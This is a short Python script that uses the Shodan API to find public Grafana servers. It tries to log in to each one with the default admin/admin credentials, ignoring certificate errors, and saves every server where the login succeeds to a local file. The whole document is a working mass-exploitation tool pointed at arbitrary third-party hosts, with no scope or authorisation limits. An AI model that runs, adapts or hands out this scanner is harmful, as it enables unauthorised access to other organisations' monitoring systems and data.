#!/usr/bin/env python
#
# grafana.py
# Search SHODAN for Grafana Default Creds
#
# Author: random_robbie

import shodan
import json
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuration
API_KEY = "YOURAPIKEY"
SEARCH_FOR = 'title:"Grafana" port:"443"'

session = requests.Session()

def login (IP,PORT,CC):
	try:
		if PORT == "443":
			http_type = "https"
		else:
			http_type = "http"
		rawBody = "{\"user\":\"admin\",\"email\":\"\",\"password\":\"admin\"}"
		headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0","Referer":"https://"+IP+":"+PORT+"/login","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/json;charset=utf-8"}
		response = session.post(""+http_type+"://"+IP+":"+PORT+"/login", data=rawBody, headers=headers, verify=False)
		if response.status_code == 200:
			print ("[*]Found Working Login ... Logging to file.[*]")
			text_file = open("./cfg/default.txt", "a")
			text_file.write(""+http_type+"://"+IP+":"+PORT+"/login\n")
			text_file.close()
		else:
			print ("[*]Unable to login[*]")
	except Exception as e:
		print('Error: %s' % e)



	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = str(service['ip_str'])
				PORT = str(service['port'])
				CC = service['location']['country_name']
				login (IP,PORT,CC)

				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)